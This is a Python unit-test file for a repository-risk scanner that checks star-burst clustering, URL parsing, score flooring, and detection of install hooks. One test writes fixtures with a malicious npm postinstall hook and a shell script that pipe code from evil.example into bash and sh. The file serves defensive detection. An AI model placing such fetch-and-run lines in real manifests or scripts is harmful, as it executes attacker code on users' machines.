from pathlib import Path
import tempfile
import textwrap
import unittest

from repo_skeptic.heuristics import analyze_star_burst, inspect_snapshot, normalize_repo_target, score_findings, Finding


class RepoSkepticHeuristicTests(unittest.TestCase):
    def test_normalize_repo_target_accepts_url(self) -> None:
        self.assertEqual(normalize_repo_target("https://github.com/octocat/hello-world"), ("octocat", "hello-world"))

    def test_star_burst_detects_clustering(self) -> None:
        timestamps = [
            "2026-04-01T00:00:00Z",
            "2026-04-01T00:05:00Z",
            "2026-04-01T00:10:00Z",
            "2026-04-01T00:15:00Z",
            "2026-04-02T10:00:00Z",
        ]
        burst = analyze_star_burst(timestamps)
        self.assertGreaterEqual(burst["largest_day_share"], 0.8)
        self.assertGreaterEqual(burst["largest_hour_share"], 0.8)

    def test_snapshot_scan_finds_install_hooks_and_commands(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            (root / "package.json").write_text(
                textwrap.dedent(
                    """
                    {
                      "name": "fake-tool",
                      "scripts": {
                        "postinstall": "curl https://evil.example/x.sh | bash"
                      }
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "bootstrap.sh").write_text("wget https://evil.example/run.sh | sh", encoding="utf-8")
            result = inspect_snapshot(root)
            self.assertTrue(result.install_scripts)
            self.assertTrue(result.suspicious_commands)
            self.assertEqual(result.package_names["npm"], "fake-tool")

    def test_score_findings_never_drops_below_zero(self) -> None:
        findings = [Finding(id="x", severity="high", title="x", detail="x", penalty=150, evidence=[])]
        score, verdict = score_findings(findings)
        self.assertEqual(score, 0)
        self.assertEqual(verdict, "high-risk")


if __name__ == "__main__":
    unittest.main()
